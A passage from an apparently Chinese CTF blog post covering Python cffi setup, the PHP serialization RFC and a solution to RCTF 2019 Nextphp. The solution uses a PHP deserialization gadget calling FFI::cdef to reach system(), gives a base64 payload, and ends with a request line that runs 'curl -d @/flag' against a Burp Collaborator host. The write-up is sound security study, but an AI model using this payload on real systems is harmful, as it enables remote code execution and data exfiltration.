&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">version&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">classifiers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Development Status :: 4 - Beta&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 2&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 3&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: Implementation :: PyPy&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;License :: OSI Approved :: BSD License&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">packages&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">find_packages&lt;/span>&lt;span style="color:#111">(),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">install_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setup_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cffi_modules&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;./build_fnmatch.py:ffi&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后的cffi_modules指定了需要生成ffi实例的文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pyhon setup.py install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190508189.png" alt="image-20211202190508189">&lt;/p>
&lt;p>没想到是个报错，仔细看一下原因，解决方法是把之前的fnmatch.h中的偏移换成16进制&lt;/p>
&lt;p>再次执行就好了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190825764.png" alt="image-20211202190825764">&lt;/p>
&lt;p>可以看到这种方式比之前生成的文件都要多，相当于安装了一个模块&lt;/p>
&lt;p>然后是一个test_fnmatch.py，注意这里直接用给出的文件还是会报错，把下图高亮的地方换成0x1&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202191447689.png" alt="image-20211202191447689">&lt;/p>
&lt;p>再执行就好了&lt;/p>
&lt;p>cffi和ctypes还有很多的花活，鉴于我的代码能力一般（c和python都是勉强够用的水平），就不班门弄斧了，更多的东西还是看官方文档比较靠谱（链接贴在最后了&lt;/p>
&lt;p>————什么？为什么FFI in PHP介绍的还不如FFI in Python的多？&lt;/p>
&lt;p>emmmmm 这个嘛 才不会说是因为懒呢&lt;/p>
&lt;h2 id="serializable">Serializable&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | php7.4启用&lt;/li>
&lt;/ul>
&lt;p>已有的反序列化魔术方法总是有很多安全问题，这个提议新增了&lt;code>__serialize()&lt;/code>，&lt;code>__unserialize()&lt;/code>，&lt;code>serialize()&lt;/code>，&lt;code>unserialize()&lt;/code>和&lt;code>Serializable()&lt;/code>&lt;/p>
&lt;p>&lt;code>serialize()&lt;/code>检查到&lt;code>__serialize()&lt;/code>的存在后将在序列化之前优先执行，返回序列化形式的数组，如有错抛出TypeError；如果同时有&lt;code>__serialize()&lt;/code>和&lt;code>__sleep()&lt;/code>，后者将被忽略；如果对象实现了&lt;code>Serializable()&lt;/code>接口，接口的&lt;code>serialize()&lt;/code>将被忽略，类中的&lt;code>__serialize()&lt;/code>将被调用；反序列化时触发&lt;code>__unserialize()&lt;/code>&lt;/p>
&lt;p>————好勾八复杂的，建议直接看文档&lt;/p>
&lt;h2 id="rctf-2019nextphp">[RCTF 2019]Nextphp&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;print_r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__serialize&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果熟读以上三个文档，这个题就很好出了&lt;/p>
&lt;p>我们可以把func设为&lt;code>FFI:cdef&lt;/code>，arg设为&lt;code>int system(char *command)&lt;/code>来执行c代码绕过php.ini中的限制；同时由于Serializable的种种新特性（出题人也在这里设了坑），我们在构造poc时要删除&lt;code>__serialize()&lt;/code>，防止直接return进坑里了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;FFI::cdef&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;int system(char *command);&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;start&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>随后在传入的地方执行&lt;code>unserialize(base64_decode(payload))-&amp;gt;__serialize()['ret']-&amp;gt;system(command);&lt;/code>，直接curl外带flag&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&amp;gt;__serialize()[&amp;#39;ret&amp;#39;]-&amp;gt;system(&amp;#34;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net&amp;#34;);
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223140032.png" alt="image-20211202223140032">&lt;/p>
&lt;p>————在这个题出现之后蚁剑还专门出了对应的插件&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223257130.png" alt="image-20211202223257130">&lt;/p>
&lt;p>但是多次尝试失败，之后看到了这个&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a>之后再看&lt;a href="https://wiki.php.net/rfc/ffi">官方文档&lt;/a>还有&lt;a href="https://www.laruence.com/2020/03/11/5475.html">这一篇&lt;/a>就明白了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223422195.png" alt="image-20211202223422195">&lt;/p>
&lt;p>默认情况下FFI只会被用于CLI模式下&amp;amp;预加载php脚本，除非设置&lt;code>ffi.enable=true&lt;/code>，设置之后在webshell就可以直接用蚁剑插件了&lt;/p>
&lt;h3 id="极客大挑战-2020roamphp5-fighterfightsinvincibly">[极客大挑战 2020]Roamphp5-FighterFightsInvincibly&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173057497.png" alt="image-20211204173057497">&lt;/p>
&lt;p>很漂亮的前端，看页面源码有注释的提示&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173130852.png" alt="image-20211204173130852">&lt;/p>
